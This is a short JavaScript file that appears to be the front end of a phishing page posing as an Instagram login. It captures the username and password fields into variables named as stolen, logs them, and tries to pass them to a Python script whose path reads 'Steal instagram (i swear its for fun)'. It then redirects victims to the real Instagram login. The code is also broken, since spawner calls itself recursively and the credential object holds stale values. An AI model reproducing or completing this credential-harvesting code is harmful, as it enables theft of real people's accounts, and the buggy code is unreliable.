let usernameHTML = document.getElementById("username");
let passwordHTML = document.getElementById("password");

let usernameStolen = usernameHTML.value;
let passwordStolen = passwordHTML.value;

usernameHTML.addEventListener("change", (event) => {
  usernameStolen = usernameHTML.value;
  passwordStolen = passwordHTML.value;
  console.log(usernameStolen);
});
passwordHTML.addEventListener("change", (event) => {
  passwordStolen = passwordHTML.value;
  console.log(passwordStolen);
  spawner();
});

function login() {
  window.location.href = "https://www.instagram.com/accounts/login/";
}
const data_to_pass_in = {
  data_send: [usernameStolen, passwordStolen],
  data_received: undefined,
};

function spawner() {
  spawner("python", [
    "Steal instagram (i swear its for fun)\realLogin.py",
    JSON.stringify(data_to_pass_in),
  ]);
}
